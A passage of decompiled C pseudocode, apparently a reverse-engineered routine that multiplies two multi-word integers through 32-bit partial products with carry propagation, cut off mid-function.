  __int64 v1081; // r10
  unsigned __int64 v1082; // r8
  __int64 v1083; // rcx
  unsigned __int64 v1084; // rax
  __int64 v1085; // r8
  unsigned __int64 v1086; // r9
  __int64 v1087; // rdx
  __int64 v1088; // rdx
  unsigned __int64 v1089; // r9
  __int64 v1090; // rcx
  unsigned __int64 v1091; // r11
  unsigned __int64 v1092; // rsi
  __int64 v1093; // rax
  unsigned __int64 result; // rax

  v5 = (unsigned int)*a2;
  v7 = HIDWORD(*a2);
  v8 = (unsigned int)*a3;
  v9 = v8 * v7;
  v10 = HIDWORD(*a3);
  v11 = v10 * v7;
  v12 = v9 + v10 * v5;
  v13 = v11 + 0x100000000i64;
  if ( v12 >= v9 )
    v13 = v11;
  v14 = HIDWORD(v12) + v13;
  v15 = v12 << 32;
  v16 = v14 + 1;
  v17 = v15 + v8 * v5;
  v18 = v17 < v15;
  *a1 = v17;
  v19 = *a2;
  if ( !v18 )
    v16 = v14;
  v20 = (unsigned int)v19;
  v21 = a3[1];
  v22 = (unsigned int)v21;
  v21 >>= 32;
  v23 = v21 * (unsigned int)v19;
  v24 = HIDWORD(v19);
  v25 = v21 * HIDWORD(v19);
  v26 = v22 * v24;
  v27 = v25 + 0x100000000i64;
  v28 = v26 + v23;
  if ( v28 >= v26 )
    v27 = v25;
  v29 = HIDWORD(v28) + v27;
  v30 = v28 << 32;
  v31 = v29 + 1;
  v32 = v30 + v22 * v20;
  v33 = (unsigned int)a2[1];
  if ( v32 >= v30 )
    v31 = v29;
  v34 = v32 + v16;
  v35 = v31 + 1;
  if ( v32 + v16 >= v32 )
    v35 = v31;
  v36 = v35;
  v37 = (unsigned int)*a3;
  v38 = HIDWORD(a2[1]);
  v39 = HIDWORD(*a3);
  v40 = v37 * v38;
  v41 = v39 * v38;
  v42 = v41 + 0x100000000i64;
  v43 = v40 + v39 * (unsigned int)v33;
  if ( v43 >= v40 )
    v42 = v41;
  v44 = 1i64;
  v45 = HIDWORD(v43) + v42;
  v46 = v43 << 32;
  v47 = v45 + 1;
  v48 = v46 + v37 * v33;
  if ( v48 >= v46 )
    v47 = v45;
  v49 = v48 + v34;
  a1[1] = v49;
  v50 = v47 + 1;
  if ( v49 >= v48 )
    v50 = v47;
  v51 = v50 + v36;
  v52 = (unsigned int)*a3;
  if ( v51 >= v50 )
    v44 = 0i64;
  v53 = HIDWORD(*a3);
  v54 = HIDWORD(a2[2]);
  v55 = v52 * v54;
  v56 = v53 * v54;
  v57 = v55 + v53 * (unsigned int)a2[2];
  v58 = v56 + 0x100000000i64;
  if ( v57 >= v55 )
    v58 = v56;
  v59 = a2[1];
  v60 = HIDWORD(v57) + v58;
  v61 = v57 << 32;
  v62 = v60 + 1;
  v63 = v61 + v52 * (unsigned int)a2[2];
  if ( v63 >= v61 )
    v62 = v60;
  v64 = v63 + v51;
  v18 = v64 < v63;
  v65 = (unsigned int)v59;
  v66 = (unsigned int)v59;
  v67 = v62 + 1;
  if ( !v18 )
    v67 = v62;
  v68 = v67 + v44;
  v69 = (unsigned int)a3[1];
  v70 = v68 < v67;
  v71 = HIDWORD(a3[1]);
  v72 = HIDWORD(v59);
  v73 = v70 + 1;
  v74 = v69 * v72;
  v75 = v71 * v72;
  v76 = v74 + v71 * v66;
  v77 = v75 + 0x100000000i64;
  if ( v76 >= v74 )
    v77 = v75;
  v78 = HIDWORD(v76) + v77;
  v79 = v76 << 32;
  v80 = v78 + 1;
  v81 = v79 + v69 * v65;
  if ( v81 >= v79 )
    v80 = v78;
  v82 = v81 + v64;
  v83 = v80 + 1;
  if ( v82 >= v81 )
    v83 = v80;
  v84 = v83 + v68;
  v85 = *a2;
  v86 = a3[2];
  if ( v84 >= v83 )
    v73 = v70;
  v87 = (unsigned int)v86;
  v88 = HIDWORD(v86);
  v89 = (unsigned int)v85;
  v90 = HIDWORD(v85);
  v91 = v73 + 1;
  v92 = v88 * HIDWORD(v85);
  v93 = v87 * v90;
  v94 = v92 + 0x100000000i64;
  v95 = v93 + v88 * (unsigned int)v89;
  if ( v95 >= v93 )
    v94 = v92;
  v96 = HIDWORD(v95) + v94;
  v97 = v95 << 32;
  v98 = v96 + 1;
  v99 = v97 + v87 * v89;
  if ( v99 >= v97 )
    v98 = v96;
  v100 = v99 + v82;
  a1[2] = v100;
  v101 = *a2;
  v102 = v98 + 1;
  if ( v100 >= v99 )
    v102 = v98;
  v103 = v102 + v84;
  v104 = (unsigned int)a3[3];
  if ( v103 >= v102 )
    v91 = v73;
  v105 = HIDWORD(a3[3]);
  v106 = HIDWORD(v101);
  v107 = v105 * HIDWORD(v101);
  v108 = v104 * v106;
  v109 = v107 + 0x100000000i64;
  v110 = v108 + v105 * (unsigned int)*a2;
  if ( v110 >= v108 )
    v109 = v107;
  v111 = a2[1];
  v112 = HIDWORD(v110) + v109;
  v113 = v110 << 32;
  v114 = v112 + 1;
  v115 = v113 + v104 * (unsigned int)*a2;
  if ( v115 >= v113 )
    v114 = v112;
  v116 = v115 + v103;
  v18 = v116 < v115;
  v117 = (unsigned int)v111;
  v118 = (unsigned int)v111;
  v119 = v114 + 1;
  if ( !v18 )
    v119 = v114;
  v120 = (unsigned int)a3[2];
  v121 = v119 + v91;
  v122 = v119 + v91 < v119;
  v123 = HIDWORD(v111);
  v124 = HIDWORD(a3[2]);
  v125 = v120 * v123;
  v126 = v124 * v123;
  v127 = v125 + v124 * v118;
  v128 = v122 + 1;
  v129 = v126 + 0x100000000i64;
  if ( v127 >= v125 )
    v129 = v126;
  v130 = a2[2];
  v131 = HIDWORD(v127) + v129;
  v132 = v127 << 32;
  v133 = v131 + 1;
  v134 = v132 + v120 * v117;
  if ( v134 >= v132 )
    v133 = v131;
  v135 = v134 + v116;
  v18 = v135 < v134;
  v136 = (unsigned int)v130;
  v137 = (unsigned int)v130;
  v138 = v133 + 1;
  if ( !v18 )
    v138 = v133;
  v139 = v138 + v121;
  v140 = (unsigned int)a3[1];
  if ( v139 >= v138 )
    v128 = v122;
  v141 = HIDWORD(a3[1]);
  v142 = HIDWORD(v130);
  v143 = v128 + 1;
  v144 = v140 * v142;
  v145 = v141 * v142;
  v146 = v144 + v141 * v137;
  v147 = v145 + 0x100000000i64;
  if ( v146 >= v144 )
    v147 = v145;
  v148 = a2[3];
  v149 = HIDWORD(v146) + v147;
  v150 = v146 << 32;
  v151 = v149 + 1;
  v152 = v150 + v140 * v136;
  if ( v152 >= v150 )
    v151 = v149;
  v153 = v152 + v135;
  v18 = v153 < v152;
  v154 = (unsigned int)v148;
  v155 = (unsigned int)v148;
  v156 = v151 + 1;
  if ( !v18 )
    v156 = v151;
  v157 = v156 + v139;
  v158 = (unsigned int)*a3;
  if ( v157 >= v156 )
    v143 = v128;
  v159 = HIDWORD(*a3);
  v160 = HIDWORD(v148);
  v161 = v158 * v160;
  v162 = v159 * v160;
  v163 = v161 + v159 * v155;
  v164 = v162 + 0x100000000i64;
  if ( v163 >= v161 )
    v164 = v162;
  v165 = HIDWORD(v163) + v164;
  v166 = v163 << 32;
  v167 = v165 + 1;
  v168 = v166 + v158 * v154;
  if ( v168 >= v166 )
    v167 = v165;
  v169 = v168 + v153;
  v170 = v167 + 1;
  a1[3] = v169;
  v171 = a2[4];
  v172 = v143 + 1;
  if ( v169 >= v168 )
    v170 = v167;
  v173 = (unsigned int)v171;
  v174 = v170 + v157;
  v175 = (unsigned int)*a3;
  v176 = (unsigned int)v171;
  if ( v174 >= v170 )
    v172 = v143;
  v177 = HIDWORD(*a3);
  v178 = HIDWORD(v171);
  v179 = v177 * HIDWORD(v171);
  v180 = v175 * v178;
  v181 = v179 + 0x100000000i64;
  v182 = v180 + v177 * v176;
  if ( v182 >= v180 )
    v181 = v179;
  v183 = a2[3];
  v184 = HIDWORD(v182) + v181;
  v185 = v182 << 32;
  v186 = v184 + 1;
  v187 = v185 + v175 * v173;
  if ( v187 >= v185 )
    v186 = v184;
  v188 = v187 + v174;
  v18 = v188 < v187;
  v189 = (unsigned int)v183;
  v190 = (unsigned int)v183;
  v191 = v186 + 1;
  if ( !v18 )
    v191 = v186;
  v192 = (unsigned int)a3[1];
  v193 = v191 + v172;
  v194 = v191 + v172 < v191;
  v195 = HIDWORD(a3[1]);
  v196 = v194 + 1;
  v197 = HIDWORD(v183);
  v198 = v195 * HIDWORD(v183);
  v199 = v192 * v197;
  v200 = v198 + 0x100000000i64;
  v201 = v199 + v195 * v190;
  if ( v201 >= v199 )
    v200 = v198;
  v202 = a2[2];
  v203 = HIDWORD(v201) + v200;
  v204 = v201 << 32;
  v205 = v203 + 1;
  v206 = v204 + v192 * v189;
  if ( v206 >= v204 )
    v205 = v203;
  v207 = v206 + v188;
  v18 = v207 < v206;
  v208 = (unsigned int)v202;
  v209 = v205 + 1;
  if ( !v18 )
    v209 = v205;
  v210 = v209 + v193;
  v211 = (unsigned int)a3[2];
  if ( v210 >= v209 )
    v196 = v194;
  v212 = HIDWORD(v202);
  v213 = HIDWORD(a3[2]);
  v214 = v211 * v212;
  v215 = v213 * v212;
  v216 = v196 + 1;
  v217 = v214 + v213 * (unsigned int)v208;
  v218 = v215 + 0x100000000i64;
  if ( v217 >= v214 )
    v218 = v215;
  v219 = a2[1];
  v220 = HIDWORD(v217) + v218;
  v221 = v217 << 32;
  v222 = v220 + 1;
  v223 = v221 + v211 * v208;
  if ( v223 >= v221 )
    v222 = v220;
  v224 = v223 + v207;
  v18 = v224 < v223;
  v225 = (unsigned int)v219;
  v226 = (unsigned int)v219;
  v227 = v222 + 1;
  if ( !v18 )
    v227 = v222;
  v228 = v227 + v210;
  v229 = (unsigned int)a3[3];
  if ( v228 >= v227 )
    v216 = v196;
  v230 = HIDWORD(a3[3]);
  v231 = HIDWORD(v219);
  v232 = v216 + 1;
  v233 = v229 * v231;
  v234 = v230 * v231;
  v235 = v233 + v230 * v226;
  v236 = v234 + 0x100000000i64;
  if ( v235 >= v233 )
    v236 = v234;
  v237 = *a2;
  v238 = HIDWORD(v235) + v236;
  v239 = v235 << 32;
  v240 = v238 + 1;
  v241 = v239 + v229 * v225;
  if ( v241 >= v239 )
    v240 = v238;
  v242 = v241 + v224;
  v18 = v242 < v241;
  v243 = (unsigned int)v237;
  v244 = (unsigned int)v237;
  v245 = v240 + 1;
  if ( !v18 )
    v245 = v240;
  v246 = v245 + v228;
  v247 = (unsigned int)a3[4];
  if ( v246 >= v245 )
    v232 = v216;
  v248 = HIDWORD(a3[4]);
  v249 = HIDWORD(v237);
  v250 = v247 * v249;
  v251 = v248 * v249;
  v252 = v250 + v248 * v244;
  v253 = v251 + 0x100000000i64;
  if ( v252 >= v250 )
    v253 = v251;
  v254 = HIDWORD(v252) + v253;
  v255 = v252 << 32;
  v256 = v254 + 1;
  v257 = v255 + v247 * v243;
  v258 = v232 + 1;
  if ( v257 >= v255 )
    v256 = v254;
  v259 = v257 + v242;
  a1[4] = v259;
  v260 = v256 + 1;
  if ( v259 >= v257 )
    v260 = v256;
  v261 = v260 + v246;
  v262 = (unsigned int)a3[5];
  if ( v261 >= v260 )
    v258 = v232;
  v263 = HIDWORD(a3[5]);
  v264 = HIDWORD(*a2);
  v265 = v262 * v264;
  v266 = v263 * v264;
  v267 = v265 + v263 * (unsigned int)*a2;
  v268 = v266 + 0x100000000i64;
  if ( v267 >= v265 )
    v268 = v266;
  v269 = a2[1];
  v270 = HIDWORD(v267) + v268;
  v271 = v267 << 32;
  v272 = v270 + 1;
  v273 = v271 + v262 * (unsigned int)*a2;
  if ( v273 >= v271 )
    v272 = v270;
  v274 = v273 + v261;
  v18 = v274 < v273;
  v275 = (unsigned int)v269;
  v276 = (unsigned int)v269;
  v277 = v272 + 1;
  if ( !v18 )
    v277 = v272;
  v278 = (unsigned int)a3[4];
  v279 = v277 + v258;
  v280 = v277 + v258 < v277;
  v281 = HIDWORD(a3[4]);
  v282 = HIDWORD(v269);
  v283 = v280 + 1;
  v284 = v278 * v282;
  v285 = v281 * v282;
  v286 = v284 + v281 * v276;
  v287 = v285 + 0x100000000i64;
  if ( v286 >= v284 )
    v287 = v285;
  v288 = a2[2];
  v289 = HIDWORD(v286) + v287;
  v290 = v286 << 32;
  v291 = v289 + 1;
  v292 = v290 + v278 * v275;
  if ( v292 >= v290 )
    v291 = v289;
  v293 = v292 + v274;
  v294 = v291 + 1;
  if ( v293 >= v292 )
    v294 = v291;
  v295 = v294 + v279;
  v296 = (unsigned int)a3[3];
  if ( v295 >= v294 )
    v283 = v280;
  v297 = HIDWORD(a3[3]);
  v298 = (unsigned int)v288;
  v299 = v283 + 1;
  v300 = HIDWORD(v288);
  v301 = v296 * v300;
  v302 = v297 * v300;
  v303 = v301 + v297 * (unsigned int)v298;
  v304 = v302 + 0x100000000i64;
  if ( v303 >= v301 )
    v304 = v302;
  v305 = a2[3];
  v306 = HIDWORD(v303) + v304;
  v307 = v303 << 32;
  v308 = v306 + 1;
  v309 = v307 + v296 * v298;
  if ( v309 >= v307 )
    v308 = v306;
  v310 = v309 + v293;
  v18 = v310 < v309;
  v311 = (unsigned int)v305;
  v312 = (unsigned int)v305;
  v313 = v308 + 1;
  if ( !v18 )
    v313 = v308;
  v314 = v313 + v295;
  v315 = (unsigned int)a3[2];
  if ( v314 >= v313 )
    v299 = v283;
  v316 = HIDWORD(a3[2]);
  v317 = HIDWORD(v305);
  v318 = v299 + 1;
  v319 = v315 * v317;
  v320 = v316 * v317;
  v321 = v319 + v316 * v312;
  v322 = v320 + 0x100000000i64;
  if ( v321 >= v319 )
    v322 = v320;
  v323 = a2[4];
  v324 = HIDWORD(v321) + v322;
  v325 = v321 << 32;
  v326 = v324 + 1;
  v327 = v325 + v315 * v311;
  if ( v327 >= v325 )
    v326 = v324;
  v328 = v327 + v310;
  v18 = v328 < v327;
  v329 = (unsigned int)v323;
  v330 = (unsigned int)v323;
  v331 = v326 + 1;
  if ( !v18 )
    v331 = v326;
  v332 = v331 + v314;
  v333 = (unsigned int)a3[1];
  if ( v332 >= v331 )
    v318 = v299;
  v334 = HIDWORD(v323);
  v335 = HIDWORD(a3[1]);
  v336 = v333 * v334;
  v337 = v335 * v334;
  v338 = v337 + 0x100000000i64;
  v339 = v336 + v335 * v330;
  if ( v339 >= v336 )
    v338 = v337;
  v340 = HIDWORD(v339) + v338;
  v341 = a2[5];
  v342 = v340 + 1;
  v343 = v339 << 32;
  v344 = v318 + 1;
  v345 = v343 + v333 * v329;
  if ( v345 >= v343 )
    v342 = v340;
  v346 = v345 + v328;
  v18 = v346 < v345;
  v347 = (unsigned int)v341;
  v348 = (unsigned int)v341;
  v349 = v342 + 1;
  if ( !v18 )
    v349 = v342;
  v350 = v349 + v332;
  v351 = (unsigned int)*a3;
  if ( v350 >= v349 )
    v344 = v318;
  v352 = HIDWORD(*a3);
  v353 = HIDWORD(v341);
  v354 = v344 + 1;
  v355 = v351 * v353;
  v356 = v352 * v353;
  v357 = v355 + v352 * v348;
  v358 = v356 + 0x100000000i64;
  if ( v357 >= v355 )
    v358 = v356;
  v359 = HIDWORD(v357) + v358;
  v360 = v357 << 32;
  v361 = v359 + 1;
  v362 = v360 + v351 * v347;
  if ( v362 >= v360 )
    v361 = v359;
  v363 = v362 + v346;
  a1[5] = v363;
  v364 = v361 + 1;
  if ( v363 >= v362 )
    v364 = v361;
  v365 = v364 + v350;
  v366 = (unsigned int)*a3;
  if ( v365 >= v364 )
    v354 = v344;
  v367 = HIDWORD(*a3);
  v368 = HIDWORD(a2[6]);
  v369 = v366 * v368;
  v370 = v367 * v368;
  v371 = v369 + v367 * (unsigned int)a2[6];
  v372 = v370 + 0x100000000i64;
  if ( v371 >= v369 )
    v372 = v370;
  v373 = HIDWORD(v371) + v372;
  v374 = v371 << 32;
  v375 = v373 + 1;
  v376 = v374 + v366 * (unsigned int)a2[6];
  if ( v376 >= v374 )
    v375 = v373;
  v377 = v376 + v365;
  v378 = v375 + 1;
  if ( v377 >= v376 )
    v378 = v375;
  v379 = v378 + v354;
  v380 = v378 + v354 < v378;
  v381 = v380 + 1;
  v382 = (unsigned int)a3[1];
  v383 = HIDWORD(a3[1]);
  v384 = HIDWORD(a2[5]);
  v385 = v383 * v384;
  v386 = v382 * v384;
  v387 = v385 + 0x100000000i64;
  v388 = v386 + v383 * (unsigned int)a2[5];
  if ( v388 >= v386 )
    v387 = v385;
  v389 = a2[4];
  v390 = HIDWORD(v388) + v387;
  v391 = v388 << 32;
  v392 = v390 + 1;
  v393 = v391 + v382 * (unsigned int)a2[5];
  if ( v393 >= v391 )
    v392 = v390;
  v394 = v393 + v377;
  v18 = v394 < v393;
  v395 = (unsigned int)v389;
  v396 = (unsigned int)v389;
  v397 = v392 + 1;
  if ( !v18 )
    v397 = v392;
  v398 = v397 + v379;
  v399 = (unsigned int)a3[2];
  if ( v398 >= v397 )
    v381 = v380;
  v400 = HIDWORD(a3[2]);
  v401 = v381 + 1;
  v402 = HIDWORD(v389);
  v403 = v400 * HIDWORD(v389);
  v404 = v399 * v402;
  v405 = v403 + 0x100000000i64;
  v406 = v404 + v400 * v396;
  if ( v406 >= v404 )
    v405 = v403;
  v407 = a2[3];
  v408 = HIDWORD(v406) + v405;
  v409 = v406 << 32;
  v410 = v408 + 1;
  v411 = v409 + v399 * v395;
  if ( v411 >= v409 )
    v410 = v408;
  v412 = v411 + v394;
  v18 = v412 < v411;
  v413 = (unsigned int)v407;
  v414 = (unsigned int)v407;
  v415 = v410 + 1;
  if ( !v18 )
    v415 = v410;
  v416 = v415 + v398;
  v417 = (unsigned int)a3[3];
  if ( v416 >= v415 )
    v401 = v381;
  v418 = HIDWORD(v407);
  v419 = HIDWORD(a3[3]);
  v420 = v417 * v418;
  v421 = v419 * v418;
  v422 = v421 + 0x100000000i64;
  v423 = v420 + v419 * v414;
  if ( v423 >= v420 )
    v422 = v421;
  v424 = v401 + 1;
  v425 = a2[2];
  v426 = HIDWORD(v423) + v422;
  v427 = v423 << 32;
  v428 = v426 + 1;
  v429 = v427 + v417 * v413;
  if ( v429 >= v427 )
    v428 = v426;
  v430 = v429 + v412;
  v18 = v430 < v429;
  v431 = (unsigned int)v425;
  v432 = (unsigned int)v425;
  v433 = v428 + 1;
  if ( !v18 )
    v433 = v428;
  v434 = v433 + v416;
  v435 = (unsigned int)a3[4];
  if ( v434 >= v433 )
    v424 = v401;
  v436 = HIDWORD(a3[4]);
  v437 = HIDWORD(v425);
  v438 = v424 + 1;
  v439 = v435 * v437;
  v440 = v436 * v437;
  v441 = v439 + v436 * v432;
  v442 = v440 + 0x100000000i64;
  if ( v441 >= v439 )
    v442 = v440;
  v443 = a2[1];
  v444 = HIDWORD(v441) + v442;
  v445 = v441 << 32;
  v446 = v444 + 1;
  v447 = v445 + v435 * v431;
  if ( v447 >= v445 )
    v446 = v444;
  v448 = v447 + v430;
  v18 = v448 < v447;
  v449 = (unsigned int)v443;
  v450 = (unsigned int)v443;
  v451 = v446 + 1;
  if ( !v18 )
    v451 = v446;
  v452 = v451 + v434;
  v453 = (unsigned int)a3[5];
  if ( v452 >= v451 )
    v438 = v424;
  v454 = HIDWORD(a3[5]);
  v455 = HIDWORD(v443);
  v456 = v453 * v455;
  v457 = v454 * v455;
  v458 = v456 + v454 * v450;
  v459 = v457 + 0x100000000i64;
  if ( v458 >= v456 )
    v459 = v457;
  v460 = HIDWORD(v458) + v459;
  v461 = v458 << 32;
  v462 = v460 + 1;
  v463 = v461 + v453 * v449;
  if ( v463 >= v461 )
    v462 = v460;
  v464 = v463 + v448;
  v465 = v462 + 1;
  if ( v464 >= v463 )
    v465 = v462;
  v466 = v465 + v452;
  v467 = *a2;
  v468 = v438 + 1;
  v469 = (unsigned int)a3[6];
  if ( v466 >= v465 )
    v468 = v438;
  v470 = (unsigned int)v467;
  v471 = HIDWORD(a3[6]);
  v472 = v471 * (unsigned int)v467;
  v473 = HIDWORD(v467);
  v474 = v468 + 1;
  v475 = v469 * v473;
  v476 = v471 * v473;
  v477 = v475 + v472;
  v478 = v476 + 0x100000000i64;
  if ( v477 >= v475 )
    v478 = v476;
  v479 = HIDWORD(v477) + v478;
  v480 = v477 << 32;
  v481 = v479 + 1;
  v482 = v480 + v469 * v470;
  if ( v482 >= v480 )
    v481 = v479;
  v483 = v482 + v464;
  v484 = v481 + 1;
  if ( v483 >= v482 )
    v484 = v481;
  v485 = v484 + v466;
  if ( v485 >= v484 )
    v474 = v468;
  a1[6] = v483;
  v486 = (unsigned int)a3[7];
  v487 = HIDWORD(a3[7]);
  v488 = v486 * HIDWORD(*a2);
  v489 = v488 + v487 * (unsigned int)*a2;
  v490 = v487 * HIDWORD(*a2) + 0x100000000i64;
  if ( v489 >= v488 )
    v490 = v487 * HIDWORD(*a2);
  v491 = a2[1];
  v492 = HIDWORD(v489) + v490;
  v493 = v489 << 32;
  v494 = v492 + 1;
  v495 = v493 + v486 * (unsigned int)*a2;
  if ( v495 >= v493 )
    v494 = v492;
  v496 = v495 + v485;
  v18 = v496 < v495;
  v497 = (unsigned int)v491;
  v498 = (unsigned int)v491;
  v499 = v494 + 1;
  if ( !v18 )
    v499 = v494;
  v500 = v499 + v474;
  v501 = (unsigned int)a3[6];
  v502 = v500 < v499;
  v503 = HIDWORD(v491);
  v504 = HIDWORD(a3[6]);
  v505 = v501 * v503;
  v506 = v504 * v503;
  v507 = v502 + 1;
  v508 = v505 + v504 * v498;
  v509 = v506 + 0x100000000i64;
  if ( v508 >= v505 )
    v509 = v506;
  v510 = a2[2];
  v511 = HIDWORD(v508) + v509;
  v512 = v508 << 32;
  v513 = v511 + 1;
  v514 = v512 + v501 * v497;
  if ( v514 >= v512 )
    v513 = v511;
  v515 = v514 + v496;
  v18 = v515 < v514;
  v516 = (unsigned int)v510;
  v517 = (unsigned int)v510;
  v518 = v513 + 1;
  if ( !v18 )
    v518 = v513;
  v519 = v518 + v500;
  v520 = (unsigned int)a3[5];
  if ( v519 >= v518 )
    v507 = v502;
  v521 = HIDWORD(a3[5]);
  v522 = v507 + 1;
  v523 = HIDWORD(v510);
  v524 = v521 * HIDWORD(v510);
  v525 = v520 * v523;
  v526 = v524 + 0x100000000i64;
  v527 = v525 + v521 * v517;
  if ( v527 >= v525 )
    v526 = v524;
  v528 = a2[3];
  v529 = HIDWORD(v527) + v526;
  v530 = v527 << 32;
  v531 = v529 + 1;
  v532 = v530 + v520 * v516;
  if ( v532 >= v530 )
    v531 = v529;
  v533 = v532 + v515;
  v18 = v533 < v532;
  v534 = (unsigned int)v528;
  v535 = (unsigned int)v528;
  v536 = v531 + 1;
  if ( !v18 )
    v536 = v531;
  v537 = v536 + v519;
  v538 = (unsigned int)a3[4];
  if ( v537 >= v536 )
    v522 = v507;
  v539 = HIDWORD(a3[4]);
  v540 = HIDWORD(v528);
  v541 = v539 * HIDWORD(v528);
  v542 = v538 * v540;
  v543 = v541 + 0x100000000i64;
  v544 = v542 + v539 * v535;
  if ( v544 >= v542 )
    v543 = v541;
  v545 = HIDWORD(v544) + v543;
  v546 = v544 << 32;
  v547 = v545 + 1;
  v548 = v546 + v538 * v534;
  if ( v548 >= v546 )
    v547 = v545;
  v549 = v547 + 1;
  v550 = v548 + v533;
  v551 = v522 + 1;
  v18 = v550 < v548;
  v552 = (unsigned int)a2[4];
  if ( !v18 )
    v549 = v547;
  v553 = v549 + v537;
  v554 = (unsigned int)a3[3];
  if ( v553 >= v549 )
    v551 = v522;
  v555 = HIDWORD(a3[3]);
  v556 = HIDWORD(a2[4]);
  v557 = v551 + 1;
  v558 = v554 * v556;
  v559 = v555 * v556;
  v560 = v558 + v555 * (unsigned int)v552;
  v561 = v559 + 0x100000000i64;
  if ( v560 >= v558 )
    v561 = v559;
  v562 = a2[5];
  v563 = HIDWORD(v560) + v561;
  v564 = v560 << 32;
  v565 = v563 + 1;
  v566 = v564 + v554 * v552;
  if ( v566 >= v564 )
    v565 = v563;
  v567 = v566 + v550;
  v18 = v567 < v566;
  v568 = (unsigned int)v562;
  v569 = (unsigned int)v562;
  v570 = v565 + 1;
  if ( !v18 )
    v570 = v565;
  v571 = v570 + v553;
  v572 = (unsigned int)a3[2];
  if ( v571 >= v570 )
    v557 = v551;
  v573 = HIDWORD(a3[2]);
  v574 = HIDWORD(v562);
  v575 = v557 + 1;
  v576 = v572 * v574;
  v577 = v573 * v574;
  v578 = v576 + v573 * v569;
  v579 = v577 + 0x100000000i64;
  if ( v578 >= v576 )
    v579 = v577;
  v580 = a2[6];
  v581 = HIDWORD(v578) + v579;
  v582 = v578 << 32;
  v583 = v581 + 1;
  v584 = v582 + v572 * v568;
  if ( v584 >= v582 )
    v583 = v581;
  v585 = v584 + v567;
  v18 = v585 < v584;
  v586 = (unsigned int)v580;
  v587 = v583 + 1;
  if ( !v18 )
    v587 = v583;
  v588 = v587 + v571;
  v589 = (unsigned int)a3[1];
  if ( v588 >= v587 )
    v575 = v557;
  v590 = HIDWORD(a3[1]);
  v591 = HIDWORD(v580);
  v592 = v589 * v591;
  v593 = v590 * v591;
  v594 = v575 + 1;
  v595 = v592 + v590 * (unsigned int)v586;
  v596 = v593 + 0x100000000i64;
  if ( v595 >= v592 )
    v596 = v593;
  v597 = a2[7];
  v598 = HIDWORD(v595) + v596;
  v599 = v595 << 32;
  v600 = v598 + 1;
  v601 = v599 + v589 * v586;
  if ( v601 >= v599 )
    v600 = v598;
  v602 = v601 + v585;
  v18 = v602 < v601;
  v603 = (unsigned int)v597;
  v604 = (unsigned int)v597;
  v605 = v600 + 1;
  if ( !v18 )
    v605 = v600;
  v606 = v605 + v588;
  v607 = (unsigned int)*a3;
  if ( v606 >= v605 )
    v594 = v575;
  v608 = HIDWORD(*a3);
  v609 = HIDWORD(v597);
  v610 = v594 + 1;
  v611 = v607 * v609;
  v612 = v608 * v609;
  v613 = v611 + v608 * v604;
  v614 = v612 + 0x100000000i64;
  if ( v613 >= v611 )
    v614 = v612;
  v615 = HIDWORD(v613) + v614;
  v616 = v613 << 32;
  v617 = v615 + 1;
  v618 = v616 + v607 * v603;
  if ( v618 >= v616 )
    v617 = v615;
  v619 = v618 + v602;
  v620 = v617 + 1;
  if ( v619 >= v618 )
    v620 = v617;
  v621 = v620 + v606;
  if ( v621 >= v620 )
    v610 = v594;
  a1[7] = v619;
  v622 = (unsigned int)a3[1];
  v623 = v622 * HIDWORD(a2[7]);
  v624 = HIDWORD(a3[1]);
  v625 = v624 * HIDWORD(a2[7]) + 0x100000000i64;
  v626 = v623 + v624 * (unsigned int)a2[7];
  if ( v626 >= v623 )
    v625 = v624 * HIDWORD(a2[7]);
  v627 = HIDWORD(v626) + v625;
  v628 = v626 << 32;
  v629 = a2[6];
  v630 = v627 + 1;
  v631 = v628 + v622 * (unsigned int)a2[7];
  if ( v631 >= v628 )
    v630 = v627;
  v632 = v631 + v621;
  v18 = v632 < v631;
  v633 = (unsigned int)v629;
  v634 = (unsigned int)v629;
  v635 = v630 + 1;
  if ( !v18 )
    v635 = v630;
  v636 = v635 + v610;
  v637 = (unsigned int)a3[2];
  v638 = v636 < v635;
  v639 = HIDWORD(a3[2]);
  v640 = HIDWORD(v629);
  v641 = v638 + 1;
  v642 = v637 * v640;
  v643 = v639 * v640;
  v644 = v642 + v639 * v634;
  v645 = v643 + 0x100000000i64;
  if ( v644 >= v642 )
    v645 = v643;
  v646 = a2[5];
  v647 = HIDWORD(v644) + v645;
  v648 = v644 << 32;
  v649 = v647 + 1;
  v650 = v648 + v637 * v633;
  if ( v650 >= v648 )
    v649 = v647;
  v651 = v650 + v632;
  v18 = v651 < v650;
  v652 = (unsigned int)v646;
  v653 = (unsigned int)v646;
  v654 = v649 + 1;
  if ( !v18 )
    v654 = v649;
  v655 = v654 + v636;
  v656 = (unsigned int)a3[3];
  if ( v655 >= v654 )
    v641 = v638;
  v657 = HIDWORD(a3[3]);
  v658 = HIDWORD(v646);
  v659 = v641 + 1;
  v660 = v656 * v658;
  v661 = v657 * v658;
  v662 = v660 + v657 * v653;
  v663 = v661 + 0x100000000i64;
  if ( v662 >= v660 )
    v663 = v661;
  v664 = HIDWORD(v662) + v663;
  v665 = v662 << 32;
  v666 = v664 + 1;
  v667 = v665 + v656 * v652;
  if ( v667 >= v665 )
    v666 = v664;
  v668 = v667 + v651;
  v669 = v666 + 1;
  if ( v668 >= v667 )
    v669 = v666;
  v670 = v669 + v655;
  v671 = (unsigned int)a3[4];
  if ( v670 >= v669 )
    v659 = v641;
  v672 = v659 + 1;
  v673 = HIDWORD(a3[4]);
  v674 = v671 * HIDWORD(a2[4]);
  v675 = v674 + v673 * (unsigned int)a2[4];
  v676 = v673 * HIDWORD(a2[4]) + 0x100000000i64;
  if ( v675 >= v674 )
    v676 = v673 * HIDWORD(a2[4]);
  v677 = a2[3];
  v678 = HIDWORD(v675) + v676;
  v679 = v675 << 32;
  v680 = v678 + 1;
  v681 = v679 + v671 * (unsigned int)a2[4];
  if ( v681 >= v679 )
    v680 = v678;
  v682 = v681 + v668;
  v18 = v682 < v681;
  v683 = (unsigned int)v677;
  v684 = (unsigned int)v677;
  v685 = v680 + 1;
  if ( !v18 )
    v685 = v680;
  v686 = v685 + v670;
  v687 = (unsigned int)a3[5];
  if ( v686 >= v685 )
    v672 = v659;
  v688 = HIDWORD(a3[5]);
  v689 = HIDWORD(v677);
  v690 = v672 + 1;
  v691 = v687 * v689;
  v692 = v688 * v689;
  v693 = v691 + v688 * v684;
  v694 = v692 + 0x100000000i64;
  if ( v693 >= v691 )
    v694 = v692;
  v695 = a2[2];
  v696 = HIDWORD(v693) + v694;
  v697 = v693 << 32;
  v698 = v696 + 1;
  v699 = v697 + v687 * v683;
  if ( v699 >= v697 )
    v698 = v696;
  v700 = v699 + v682;
  v18 = v700 < v699;
  v701 = (unsigned int)v695;
  v702 = (unsigned int)v695;
